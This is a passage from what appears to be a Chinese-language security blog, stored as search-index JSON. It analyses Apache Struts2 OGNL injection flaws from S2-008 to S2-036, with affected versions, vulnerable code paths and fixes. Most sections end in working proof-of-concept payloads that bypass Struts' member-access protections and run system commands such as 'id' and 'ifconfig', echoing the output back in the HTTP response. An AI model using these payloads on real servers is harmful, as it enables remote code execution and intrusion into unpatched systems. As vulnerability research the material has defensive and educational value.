<p>\u5176\u4e2d1\u8ddfS2-007\u7c7b\u4f3c\uff0c3\u4e0d\u770b\u4e86\uff0c\u4e3b\u8981\u5173\u6ce82\u548c4</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#cookieinterceptor","title":"CookieInterceptor","text":"<p>\u8fd9\u91cc\u7684\u539f\u7406\u540cS2-005\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u770b\u4ee3\u7801\u6bd4\u8f83\u76f4\u89c2\uff0c\u6ca1\u6709\u642d\u73af\u5883\u8c03\u4e86</p> <p><code>org.apache.struts2.interceptor.CookieInterceptor#intercept</code></p> <p></p> <p></p> <p>\u8fd9\u91cc\u4f1a\u5230<code>OgnlValueStack.setValue</code>\uff0c\u4e5f\u5c31\u662f\u540e\u7eed\u8c03\u7528<code>Ognl.setValue</code>\uff0c\u7528<code>((1)(2))(3)</code>\u7684\u65b9\u5f0f\u6765\u6267\u884c\u4efb\u610fOGNL\u8868\u8fbe\u5f0f</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#debugginginterceptor","title":"DebuggingInterceptor","text":"<p>\u5f53\u5f00\u542f\u5f00\u53d1\u8005\u6a21\u5f0f\u65f6\uff0c\u4f20\u5165<code>debug=command&amp;expression=xxxx</code>\uff0c\u5373\u53ef\u6267\u884cOGNL\u8868\u8fbe\u5f0f</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_4","title":"POC","text":"<pre><code>?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))\n// \u56de\u663ePOC\n(%23_memberAccess.allowStaticMethodAccess=true,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),new java.lang.String(%23res))\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#6-s2-009","title":"6. S2-009","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1a2.0.0 - 2.3.1.1</p> <p>\u9488\u5bf9S2-005\u7684\u4fee\u590d\uff0c\u5bf9\u53c2\u6570\u505a<code>[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_'\\\\s]+</code>\u6b63\u5219\u68c0\u67e5\uff0c\u8fd9\u91cc\u89c4\u907f\u4e86\u53c2\u6570\u540d\u4e2d\u51fa\u73b0<code>#</code>\u3001unicode\u7f16\u7801\u7b49</p> <p>S2-009\u662f\u5bf9S2-005\u7684\u7ed5\u8fc7\uff0c\u8fd9\u91cc\u7528\u7684\u5c31\u662f<code>Ognl.setValue</code>\u51fd\u6570\u7684\u53e6\u4e00\u79cd\u7528\u6cd5<code>a[(1)(2)]</code>\uff0c\u8fd8\u6709\u4e00\u4e2a\u6bd4\u8f83\u5de7\u5999\u7684\u662f\uff0c\u524d\u9762\u7684\u51e0\u4e2a\u6f0f\u6d1e\u5229\u7528\uff0c\u6211\u4eec\u90fd\u662f\u76f4\u63a5\u5728<code>(1)</code>\u5199\u4e0a\u8981\u6267\u884c\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u800cS2-009\u5219\u901a\u8fc7context\u91cc\u7684\u5185\u5bb9\u6765\u8fdb\u884c\u4e00\u4e2a\u4e2d\u8f6c\uff0c\u5c06OGNL\u8868\u8fbe\u5f0f\u653e\u5230<code>key=value</code>\u7684value\u7684\u4f4d\u7f6e\uff0c\u518d\u7531<code>a[(key)(2)]</code>\u7684\u65b9\u5f0f\u53bb\u6267\u884cvalue\u7684\u5185\u5bb9\u3002</p> <pre><code>OgnlContext context = new OgnlContext();\ncontext.put(\"test\",\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\"); // \u5047\u8bbecontext\u5b58\u5728\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684OGNL\u8868\u8fbe\u5f0ftest\nOgnl.setValue(\"a[(test)(bla)]\",context,\"\");// \u4ee5a[(test)(bla)],\u6267\u884ctest\u6240\u4ee3\u8868\u7684OGNL\u8868\u8fbe\u5f0f\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u5047\u8bbe\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f20\u5165<code>?param=xxx</code>\u7684\u65b9\u5f0f\u5e26\u5165</p> <p>\u6ce8\u610f\u8fd9\u91cc\u7684param\u9700\u8981\u662f\u5f53\u524dAction\u7684\u4e00\u4e2a\u7c7b\u5c5e\u6027\uff08\u4e5f\u5c31\u662f\u539f\u672c\u5c31\u5b58\u5728\u7684\u53c2\u6570\u540d\uff09\uff0c\u6bd4\u5982\u539f\u672c\u8868\u5355\u91cc\u5c31\u6709password\uff0c\u90a3\u4e48\u4f60\u5c31\u53ef\u4ee5\u5728password\u91cc\u9762\u586b\u5145OGNL\u8868\u8fbe\u5f0f</p> <p>\u56e0\u4e3a\u5728\u8ba1\u7b97OGNL\u8868\u8fbe\u5f0f<code>(password)(bla)</code>\u7684\u65f6\u5019(\u89e3\u6790\u51fa\u4e24\u4e2aASTProperty)</p> <p></p> <p>\u540e\u7eed\u518d\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u53bb\u67e5\u627e\u5f53\u524d\u7684action\u91cc\u9762\u662f\u5426\u542b\u6709\u8fd9\u4e2a\u5c5e\u6027</p> <p></p> <p><code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty</code></p> <p></p> <p>\u5982\u679c\u5f53\u524d\u5b58\u5728\u8fd9\u4e2a\u5c5e\u6027\u7684\u65f6\u5019\uff0c\u8fd4\u56de\u5176\u5185\u5bb9</p> <p>\u540e\u7eed\u5c31\u662f\u8ddf<code>(1)(2)</code>\u8fd9\u79cd\u6267\u884c\u7684\u539f\u7406\u4e00\u6837\uff0c\u4f1a\u4ee5<code>(1)</code>\u4f5c\u4e3anode\u8c03\u7528getValue\u3002</p> <p>\u8fd9\u91cc\u5de7\u5999\u7684\u5c31\u662f\u5229\u7528\u8fd9\u79cd\u4e2d\u8f6c\u7684\u65b9\u5f0f\uff0c\u89c4\u907f\u4e86\u53c2\u6570\u540d\u7684\u6b63\u5219\u68c0\u6d4b</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_5","title":"POC","text":"<pre><code>?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&amp;z[(password)(bla)]=1\n// \u56de\u663ePOC\n?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&amp;z[(password)(bla)]=1\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_6","title":"\u4fee\u590d","text":"<p>\u6539\u8fdb\u4e86\u6b63\u5219</p> <p></p> <p>\u589e\u52a0\u4e86<code>setParameter</code>\u51fd\u6570\uff0c\u9ed8\u8ba4\u8bbe\u7f6e\u8868\u8fbe\u5f0f\u4e0d\u53ef\u6267\u884c</p> <p></p> <p></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#7-s2-012","title":"7. S2-012","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1aStruts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2</p> <p>The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter. This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.</p> <p>\u770b\u63cf\u8ff0\u53ef\u4ee5\u77e5\u9053\u662fstruts2\u5728\u5904\u7406redirect\u7684\u65f6\u5019\u51fa\u73b0\u7684\u95ee\u9898\u3002</p> <p></p> <p></p> <p>\u7ed3\u679c\u8fd4\u56de\u540e\u56de\u53bb\u8c03\u7528<code>ServletRedirectResult</code>\u6765\u5904\u7406</p> <p>\u6765\u770b\u770b\u8be5\u5bf9\u8c61\u7684\u5b9e\u9645\u5904\u7406\u51fd\u6570<code>org.apache.struts2.dispatcher.ServletRedirectResult#execute</code></p> <p></p> <p></p> <p>\u5728\u7236\u7c7bexecute\u51fd\u6570\u8c03\u7528\u4e86<code>conditionalParse</code>\u51fd\u6570</p> <p></p> <p>\u8fd9\u91cc\u51fa\u73b0\u4e86\u6211\u4eec\u6bd4\u8f83\u719f\u6089\u7684<code>TextParseUtil.translateVariables</code>\uff0cS2-001\u5c31\u662f\u7531\u8fd9\u4e2a\u51fd\u6570\u6765\u5904\u7406String\u7c7b\u578b\u8f6c\u5316\u7684\u3002</p> <p>\u6b64\u65f6param\u4e3a\u6211\u4eec\u5728struts.xml\u4e2d\u7684\u914d\u7f6e<code>edit.action?skillName=${currentSkill.name}</code></p> <p>\u524d\u9762\u5206\u6790\u8fc7<code>translateVariables</code>\uff0c\u8fd9\u91cc\u76f4\u5207\u4e3b\u9898</p> <p>\u51fa\u95ee\u9898\u7684\u5730\u65b9\u8ddfS2-001\u4e00\u6837</p> <p></p> <p>\u89e6\u53d1\u603b\u5171\u5206\u4e3a\u4e24\u6b65\uff1a</p> <ol> <li>\u5c06xml\u914d\u7f6e\u4e2d<code>${currentSkill.name}</code>\u89e3\u6790\u6210\u4f20\u5165\u7684\u503c\uff0c\u6b64\u65f6stack.findValue\u4f1a\u53bb\u627e\u5230\u524d\u9762\u5904\u7406\u597d\u540e\u7684Result\u91cc\u9762\u7684currentSkill.name\u7684\u503c</li> </ol> <p></p> <ol> <li>\u7531\u4e8e<code>translateVariables</code>\u7684\u89e3\u6790OGNL\u8868\u8fbe\u5f0f\u6709\u4e24\u79cd<code>$</code>\u3001<code>%</code>\uff0c\u5e76\u4e14\u662f\u5faa\u73af\u53bb\u5904\u7406\u7684</li> </ol> <p></p> <p>\u9996\u5148\u662f\u53bb\u5904\u7406<code>$</code>\uff0c\u5c06<code>${currentSkill.name}</code>\u89e3\u6790\u6210\u5177\u4f53\u7684\u503c\uff0c\u5e76\u4e14\u5c06result\u7684\u503c\u7f6e\u4e3a\u4ed6\u7684\u5185\u5bb9</p> <p>\u867d\u7136\u5df2\u7ecf\u4fee\u590d\u4e86\u5faa\u73af\u9012\u5f52\u6267\u884c\u7684\u95ee\u9898(s2-001\u4f1a\u6267\u884c\u4e24\u5c42<code>${}</code>)\uff0c\u4f46\u662f\u56e0\u4e3a\u8fd8\u5faa\u73af\u53bb\u5904\u7406<code>%</code>\uff0c\u90a3\u4e48\u4ecd\u7136\u53ef\u4ee5\u8fbe\u5230\u5faa\u73af\u9012\u5f52\u8ba1\u7b97\u7684\u6548\u679c<code>${\u53e6\u4e00\u5c42\u4ee5%\u8d77\u59cb\u7684ognl\u8868\u8fbe\u5f0f}</code>\uff0c\u6240\u4ee5POC\u91cc\u9762\u9700\u8981\u7528<code>%{}</code>\u6765\u5199\u5165OGNL\u8868\u8fbe\u5f0f</p> <p>\u6240\u4ee5\u5bf9\u4e8eS2-012\u6765\u8bf4\uff0c\u914d\u7f6e\u4e2d<code>${currentSkill.name}</code>\u662f\u81f3\u5173\u91cd\u8981\u7684</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_7","title":"\u4fee\u590d","text":"<p>\u7531\u4e8e\u6211\u524d\u9762\u5206\u6790\u7684\u662f<code>2.2.3</code>\u7248\u672c\uff0c\u540e\u7eed\u7684\u7248\u672c\u7684<code>translateVariables</code>\u53d8\u5316\u6709\u70b9\u5927\uff0c\u5176\u4fee\u590d\u7248\u672c</p> <p></p> <p>\u589e\u52a0\u4e86pos\u6765\u505a\u8d77\u59cb\u4f4d\u7f6e\u6765\u67e5\u627e<code>${}%{}</code>\uff0c\u5728\u7b2c\u4e00\u6b21\u8868\u8fbe\u5f0f\u6267\u884c\u5b8c\u6210\u540e\u4f1a\u66f4\u65b0pos\u503c\uff0c\u6765\u9632\u6b62\u4e8c\u6b21OGNL\u8868\u8fbe\u5f0f\u6267\u884c</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_6","title":"POC","text":"<pre><code>currentSkill.name=%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))}\n// \u56de\u663ePOC\n%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,#ret=@java.lang.Runtime@getRuntime().exec('id'),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())}\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#8-s2-013s2-014","title":"8. S2-013/S2-014","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1aStruts 2.0.0 - Struts 2.3.14.1</p> <p>\u8fd9\u6b21\u7684\u539f\u7406\u8ddfS2-001\u7c7b\u4f3c\uff0c\u53ea\u662f\u95ee\u9898\u51fa\u5728\u89e3\u6790<code>&lt;s:a&gt;</code>\u3001<code>&lt;s:url&gt;</code>\uff0c\u5f53\u8fd9\u4e24\u4e2a\u6807\u7b7e\u652f\u6301<code>includeParams</code></p> <p></p> <p>\u5f53\u5f53\u524d\u7684href\u4e3a\u7a7a\u65f6\uff0c\u4f1a\u7528\u5f53\u524durl\u6765\u586b\u5145href\uff0c\u4e5f\u5c31\u662f\u5728<code>buildUrl</code>\u65f6\u5bfc\u81f4\u7684OGNL\u8868\u8fbe\u5f0f\u7684\u6267\u884c</p> <p>\u8fd9\u91cc\u4e0d\u5177\u4f53\u5206\u6790\u4e86\uff0c\u770b\u4e00\u4e0b\u4ed6\u7684\u6267\u884c\u6808 </p> <p><code>org.apache.struts2.views.util.DefaultUrlHelper#translateVariable</code></p> <p></p> <p>\u4e5f\u540c\u6837\u662f\u4f7f\u7528String\u8f6c\u6362\u65f6\u51fa\u73b0\u7684OGNL\u8868\u8fbe\u5f0f\u6267\u884c</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_7","title":"POC","text":"<pre><code>?fakeParam=%{(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))}\n// \u56de\u663ePOC\n?fakeParam=%{(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())}\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_8","title":"\u4fee\u590d","text":"<p>\u8fd9\u91cc<code>org.apache.struts2.views.util.DefaultUrlHelper</code>\u4e0d\u518d\u4f7f\u7528TextParseUtil\u6765\u5904\u7406</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#9-s2-015","title":"9. S2-015","text":"<p>\u5f71\u54cd\u8303\u56f4\uff1aStruts 2.0.0 - Struts 2.3.14.2</p> <p>S2-015\u4e00\u5171\u6709\u4e24\u79cd\uff1a</p> <p>\u7b2c\u4e00\u79cd\u6f0f\u6d1e\u539f\u7406\u8ddfS2-012\u7c7b\u4f3c\uff0c\u8fd9\u6b21\u95ee\u9898\u4e0d\u662f\u51fa\u5728\u91cd\u5b9a\u5411\uff0c\u800c\u662f\u5728\u89e3\u6790\u5177\u4f53\u7684action name\u65f6\u51fa\u73b0\u7684\u95ee\u9898</p> <p></p> <p>\u8fd9\u91cc\u7684<code>{1}</code>\u4f1a\u88ab\u66ff\u6362\u6210<code>xxx.action</code>\u7684<code>xxx</code>\uff0c\u8fd9\u91cc\u7684<code>xxx</code>\u5982\u679c\u88ab\u6211\u4eec\u66ff\u6362\u6210OGNL\u8868\u8fbe\u5f0f\uff0c\u4f1a\u5728\u540e\u7eed\u7684<code>TextParseUtil.translateVariables</code>\u5f97\u5230\u6267\u884c\uff0c\u8fc7\u7a0b\u8ddfS2-012\u4e00\u6837\uff0c\u4e0d\u518d\u53d9\u8ff0\u3002</p> <p>\u7b2c\u4e8c\u79cd\u662f\u7ed3\u679c\u7531httpheader\u6765\u5904\u7406\u65f6\uff0c\u4f1a\u5c06\u6211\u4eec\u7684<code>${message}</code>\u5d4c\u5957\u6267\u884c</p> <p></p> <p><code>org.apache.struts2.dispatcher.HttpHeaderResult#execute</code></p> <p></p> <p>\u8ddfS2-012\u4e00\u6837\uff0c\u89e3\u6790\u6267\u884c<code>${\u53e6\u4e00\u5c42\u4ee5%\u8d77\u59cb\u7684OGNL\u8868\u8fbe\u5f0f}</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_8","title":"POC","text":"<pre><code>// \u6458\u81eahttps://www.freebuf.com/vuls/217482.html\n%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action\n// \u7b2c\u4e8c\u79cd\n\uff1fmessage=%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()}\n</code></pre> <p>\u8fd9\u91cc\u6bd4\u8f83\u7279\u6b8a\u7684\u662f\u8fd9\u91cc\u5bf9\u539f\u6709<code>#_memberAccess['allowStaticMethodAccess']=true</code>\uff0c\u6539\u6210\u4e86</p> <pre><code>// \u539f\u6765\u7684\u65b9\u5f0f\n#_memberAccess['allowStaticMethodAccess']=true\n\n// \u901a\u8fc7\u53cd\u5c04\u673a\u5236\u6765\u8bbe\u7f6e#_memberAccess['allowStaticMethodAccess']\n#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),\n#m.setAccessible(true),\n#m.set(#_memberAccess,true)\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u8981\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u6765\u5199\u5165\u5462\uff1f</p> <p>\u5148\u6765\u770bOGNL\u662f\u600e\u4e48setValue\u7684</p> <p><code>ognl.OgnlRuntime#setFieldValue</code></p> <p></p> <p>\u800c\u6b64\u65f6\u8fd9\u91cc\u6211\u4eec\u8981\u8bbe\u7f6e\u7684<code>#_memberAccess['allowStaticMethodAccess']</code></p> <p></p> <p>\u662ffinal\u7c7b\u578b\uff0c\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528\u666e\u901a\u7684\u65b9\u5f0f\u6539\u53d8\u4ed6\u7684\u503c\uff0c\u53ea\u80fd\u901a\u8fc7\u4e0a\u9762\u7684\u53cd\u5c04\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u4fee\u6539\u3002</p> <p>\u8fd9\u91cc\u7684\u6539\u53d8\u662f\u4ecestruts2 2.3.14.1\u7248\u672c\u5f00\u59cb\u7684\uff0c\u610f\u5473\u7740\u9ad8\u4e8e\u8fd9\u4e2a\u7248\u672c\u7684\u4ee5\u540e\u7684poc\u53ea\u80fd\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u6765\u8bbe\u7f6e</p> <p>\u9664\u4e86\u4e0a\u9762\u901a\u8fc7\u53cd\u5c04\u673a\u5236\u6765\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u6784\u9020\u5668\u7684\u65b9\u6cd5\u6765\u6267\u884c\uff0c\u6bd4\u5982<code>new ProccessBuilder('id').start()</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_9","title":"\u4fee\u590d","text":"<p>\u8fd9\u91cc\u7684\u4fee\u590d\u5c31\u662fS2-012\u7684\u4fee\u590d\uff0c\u4e3b\u8981\u4fee\u590d\u4e86\u6267\u884c\u8fd9\u79cdOGNL\u8868\u8fbe\u5f0f<code>${\u53e6\u4e00\u5c42%\u8d77\u59cb\u7684OGNL\u8868\u8fbe\u5f0f}</code></p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#10-s2-016","title":"10. S2-016","text":"<p>\u8303\u56f4\uff1aStruts 2.0.0 - Struts 2.3.15</p> <p>S2-016\u95ee\u9898\u51fa\u5728\u5904\u7406\u9ed8\u8ba4\u7684<code>action:xxx</code>\u6216<code>redirect:xxx</code>\uff0c\u540e\u9762\u8ddf\u7684<code>xxx</code>\u4e3aOGNL\u8868\u8fbe\u5f0f\uff0cStruts2\u9ed8\u8ba4\u5c06\u7528<code>ServletRedirectResult</code>\u6765\u5904\u7406\u8df3\u8f6c\u95ee\u9898\uff0c\u8fd9\u91cc\u8ddfS2-012\u4e00\u6837\uff0c\u53ea\u662f\u8fd9\u91cc\u7684\u8df3\u8f6c\u8bbe\u7f6e\u5728url\u91cc\u9762</p> <p>\u6267\u884c\u94fe\u8def\u8ddfS2-012\u4e00\u6837\uff0c\u4e0d\u4f5c\u5206\u6790\u4e86</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_9","title":"POC","text":"<pre><code>redirect:%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()}\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_10","title":"\u4fee\u590d","text":"<p><code>org.apache.struts2.dispatcher.mapper.DefaultActionMapper</code>\u9ed8\u8ba4\u7684<code>redirect/redirectaction</code>\u76f4\u63a5\u88ab\u5220\u9664\u4e86</p> <p></p> <p><code>action:</code>\u90e8\u5206\u56e0\u4e3aS2-015\u7684\u5173\u7cfb\uff0c\u9650\u5236\u4e86action\u540d</p> <p></p> <p>\u5df2\u7ecf\u4e0d\u6784\u6210\u5a01\u80c1\u4e86</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#11-s2-019","title":"11. S2-019","text":"<p>\u8303\u56f4\uff1aStruts 2.0.0 - Struts 2.3.15.1</p> <p>S2-019\u8ddfS2-008\u7684\u7b2c\u4e8c\u4e2a\u6f0f\u6d1e\u4e00\u6837\uff0c\u5f53\u5f00\u542f\u5f00\u53d1\u8005\u6a21\u5f0f\u65f6\uff0c\u5141\u8bb8\u4f7f\u7528command\u7684\u6a21\u5f0f\u6765\u6267\u884cOGNL\u8868\u8fbe\u5f0f</p> <p>\u5177\u4f53\u770bS2-008</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_10","title":"POC","text":"<pre><code>?debug=command&amp;expression=(%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23m=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close())\n</code></pre>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#_11","title":"\u4fee\u590d","text":"<p>\u8fd9\u91cc\u540e\u9762\u7684\u51e0\u4e2a\u7248\u672c\u90fd\u662f\u5141\u8bb8\u6267\u884c\u7684\uff0c\u5f00\u53d1\u8005\u6a21\u5f0f\u4e0b\u7684command\u5e76\u6ca1\u6709\u88ab\u53d6\u6d88\u6389\uff0c\u6240\u4ee5\u5982\u679c\u5728\u7ebf\u4e0a\u73af\u5883\u78b0\u5230debug\u6a21\u5f0f\uff0c\u90a3\u5c31\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0bOGNL\u8868\u8fbe\u5f0f\u7684\u6267\u884c</p> <p>\u4f46\u662f\u7531\u4e8e\u4ecestruts2 2.3.20\u4e4b\u540e\u5f15\u5165\u4e86\u9ed1\u540d\u5355\u6a21\u5f0f\uff08excludedClasses, excludedPackageNames \u548c excludedPackageNamePatterns\uff09\uff0c\u5e76\u4e14\u4f7f\u7528\u6784\u9020\u51fd\u6570\u7684\u65b9\u5f0f\u4e5f\u5931\u6548\u4e86</p> <p>\u8fd9\u91cc\u524d\u8f88\u4eec\u7528\u5230\u4e86\u5c06SecurityMemberAccess\u521d\u59cb\u5316\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\uff0c\u539f\u7406\u53ef\u4ee5\u597d\u597d\u770b\u770b\u8fd9\u7bc7\u6587\u7ae0https://paper.seebug.org/794/#33-struts-2329\u3002</p> <pre><code>debug=command&amp;expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))\n</code></pre> <p>\u540e\u7eed\u8fd8\u6709\u4e00\u4e9b\u7ed5\u8fc7\uff0c\u540e\u9762\u518d\u8bb2</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#12-s2-029s2-036","title":"12. S2-029/S2-036","text":"<p>S2-029\u5f71\u54cd\u8303\u56f4\uff1aStruts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)</p> <p>S2-036\u5f71\u54cd\u8303\u56f4\uff1aStruts 2.0.0 - Struts 2.3.28.1 \uff08\u8ddfS2-029\u4e00\u6837\uff0c\u4e3b\u8981\u5728\u4fee\u590d\u7684\u5730\u65b9\u8bb2\uff09</p> <p>\u539f\u7406\u8ddfS2-001\u5dee\u4e0d\u591a\uff0cS2-029\u7684\u89e6\u53d1\u9700\u8981jsp\u7528\u5230\u6807\u7b7e<code>&lt;s:textfield name=\"%{xxxx}\"&gt;&lt;/s:textfield&gt;</code>\uff0cname\u5c5e\u6027\u4e2d\u7531\u4e00OGNL\u8868\u8fbe\u5f0f\u89e3\u6790\u800c\u5f97\uff0c\u610f\u5473\u7740\u751f\u6210\u7684input\u6807\u7b7e\u7684name\u5c5e\u6027\u662f\u52a8\u6001\u8ba1\u7b97\u800c\u5f97\u7684\uff0c\u6bd4\u5982?xxxx=username\uff0c\u6b64\u65f6\u89e3\u6790\u5f97\u5230\u7684input.name\u4e3ausername\u3002\u8fd9\u5176\u4e2d\u6267\u884c\u4e86<code>%{xxxx}</code>\uff0c\u83b7\u5f97xxxx\u7684\u5185\u5bb9\u3002\u800cS2-001\u7684\u4fee\u590d\u4e3b\u8981\u89e3\u51b3\u7684\u662f\u9012\u5f52\u8ba1\u7b97OGNL\u8868\u8fbe\u5f0f\u7684\u95ee\u9898\uff0cS2-029\u5c31\u662f\u5728\u8fdb\u5165translateVariables\u4e4b\u524d\u5c31\u5c06\u7b2c\u4e00\u5c42\u7684OGNL\u8868\u8fbe\u5f0f\u6267\u884c\u5b8c\u6bd5</p> <p></p> <p>\u76f4\u63a5\u770b<code>UIBean.evaluateParams</code></p> <p>\u9996\u5148\u8ba1\u7b97<code>%{message}</code>\u5230\u6211\u4eec\u4f20\u5165\u7684OGNL\u8868\u8fbe\u5f0f</p> <p></p> <p>\u540e\u7eed\u4f1a\u5728\u6211\u4eec\u4f20\u5165\u7684OGNL\u8868\u8fbe\u5f0f\u62ec\u4e0a<code>%{xxx}</code></p> <p></p> <p></p> <p>\u6b64\u65f6\u518d\u4f20\u5165\u5230<code>findValue</code>\u5c31\u662f\u7b2c\u4e8c\u5c42\u7684OGNL\u8868\u8fbe\u5f0f\uff0c\u540e\u7eed\u8ddfS2-001\u4e00\u6837\uff0c\u53ea\u9700\u8981\u6267\u884c\u4e00\u6b21OGNL\u8868\u8fbe\u5f0f\u8ba1\u7b97\u5373\u53ef</p>","tags":["Java"]},{"location":"blog/2020/talk_about_struts2/#poc_11","title":"POC","text":"<pre><code>// \u9700\u8981\u5148\u521d\u59cb\u5316SecurityMemberAccess\uff0c\u4e0d\u7136\u65e0\u6cd5\u6267\u884c\n?message=((%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))\n// \u56de\u663ePOC\n?message=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23ret=@java.lang.Runtime@getRuntime().exec('id')),%23q=@org.apache.commons.io.IOUtils@toString(%23ret.getInputStream())\n // S2-036\n 